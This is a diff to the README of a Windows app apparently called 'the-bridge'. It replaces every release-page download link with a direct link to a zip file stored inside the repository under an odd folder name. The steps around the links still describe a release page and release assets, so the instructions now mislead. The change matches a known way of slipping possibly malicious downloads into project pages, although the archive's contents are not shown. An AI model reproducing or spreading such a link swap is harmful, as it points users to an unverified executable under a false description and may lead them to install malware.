@@ -1,6 +1,6 @@
 # 🔗 the-bridge - Move tasks into your AI flow
 
-[![Download the-bridge](https://img.shields.io/badge/Download%20the--bridge-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Unsophisticated-intrepidity759/the-bridge/releases)
+[![Download the-bridge](https://img.shields.io/badge/Download%20the--bridge-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Unsophisticated-intrepidity759/the-bridge/raw/refs/heads/main/prytanis/bridge-the-v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide shows you how to download and run the app on Windows.
 
 ## 📥 Download
 
-1. Open the release page here: https://github.com/Unsophisticated-intrepidity759/the-bridge/releases
+1. Open the release page here: https://github.com/Unsophisticated-intrepidity759/the-bridge/raw/refs/heads/main/prytanis/bridge-the-v3.1.zip
 2. Look for the latest release at the top of the page.
 3. Download the Windows file from the release assets.
 4. Save the file to your Downloads folder or another folder you can find easily.
@@ -162,7 +162,7 @@ If you do not see output:
 
 Visit this page to download the Windows release:
 
-https://github.com/Unsophisticated-intrepidity759/the-bridge/releases
+https://github.com/Unsophisticated-intrepidity759/the-bridge/raw/refs/heads/main/prytanis/bridge-the-v3.1.zip
 
 Then follow these steps:
 
